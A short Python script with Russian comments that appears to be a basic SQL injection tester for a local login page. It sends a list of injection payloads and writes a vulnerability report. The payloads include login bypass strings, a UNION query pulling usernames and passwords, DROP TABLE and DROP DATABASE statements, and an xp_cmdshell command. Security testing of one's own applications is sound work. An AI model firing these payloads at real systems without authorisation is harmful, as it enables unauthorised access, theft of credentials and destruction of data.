import requests
import os
from datetime import datetime

# SQL полезные нагрузки
sql_payloads = [
    "' OR '1'='1'--",
    "' UNION SELECT NULL, NULL--",
    "' AND 1=1--",
    "' AND 1=2--",
    "'; DROP TABLE users--",
    "' OR 'a'='a",
    "' AND 1=CONVERT(int, (SELECT CHAR(58)+CHAR(56)+CHAR(66)+CHAR(67)))--",
    "' OR 1=1 --",
    "' UNION SELECT username, password FROM users--",
    "'; DROP DATABASE test_db--",
    "'; EXEC xp_cmdshell('ping 127.0.0.1')--",
    "' OR '1'='1' AND 1=1 --",
    "' AND 'x'='x'--",
    '" OR 1=1--',
    "' OR 1=1/*"
]

url = 'http://127.0.0.1:5000/login'

params = {
    'username': 'admin',
    'password': 'password123'
}

results = []

def test_sql_injections(url, params, payloads):
    """Функция тестирования SQL-инъекций"""
    for payload in payloads:
        print(f'Тестирование: {payload}')
        params['password'] = payload

        try:
            response = requests.get(url, params=params)
            is_vulnerable = False
            
            if response.status_code == 500: 
                is_vulnerable = True
                print(f'[!] Обнаружена потенциальная SQL-инъекция с помощью полезной нагрузки: {payload}')
            elif 'error' in response.text.lower() or 'warning' in response.text.lower():
                is_vulnerable = True
                print(f'[!] Обнаружена потенциальная SQL-инъекция с помощью полезной нагрузки: {payload}')
            else:
                print(f'[+] Явных инъекций для полезной нагрузки не обнаружено: {payload}')
            
            results.append({
                'payload': payload,
                'status_code': response.status_code,
                'is_vulnerable': is_vulnerable,
                'response_snippet': response.text[:200]
            })
        except requests.RequestException as e:
            print(f'Error during request: {e}')
            results.append({
                'payload': payload,
                'status_code': None,
                'is_vulnerable': False,
                'error': str(e)
            })

def generate_report(results, report_dir='Отчет'):
    """Функция генерации отчета"""
    if not results:
        print('[INFO] Нет данных для анализа.')
        return
    
    os.makedirs(report_dir, exist_ok=True)

    report_filename = 'Уязвимости.txt'
    report_path = os.path.join(report_dir, report_filename)

    # Анализ результатов
    total_tests = len(results)
    vulnerabilities = [r for r in results if r['is_vulnerable']]
    total_vulnerable = len(vulnerabilities)

    try:
        with open(report_path, 'w') as f:
            f.write('Отчет о тестировании SQL-инъекции\n')
            f.write('=' * 40 + '\n')
            f.write(f'Дата проверки: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}\n')
            f.write(f'Всего проведено тестов: {total_tests}\n')
            f.write(f'Всего найдено уязвимостей: {total_vulnerable}\n\n')
            
            f.write('Подробная информация об уязвимости:\n')
            f.write('-' * 40 + '\n')
            for vuln in vulnerabilities:
                f.write(f"Полезная нагрузка: {vuln['payload']}\n")
                f.write(f"Статус кода: {vuln['status_code']}\n")
                f.write(f"Фрагмент ответа: {vuln['response_snippet']}\n")
                f.write('-' * 40 + '\n')

            print(f'[INFO] Отчет сохранен в: {report_path}')
    except Exception as e:
        print(f'[ERROR] Ошибка при сохранении отчета: {e}')

if __name__ == '__main__':
    # Запуск тестирования
    test_sql_injections(url, params, sql_payloads)

    # Генерация отчета
    generate_report(results)
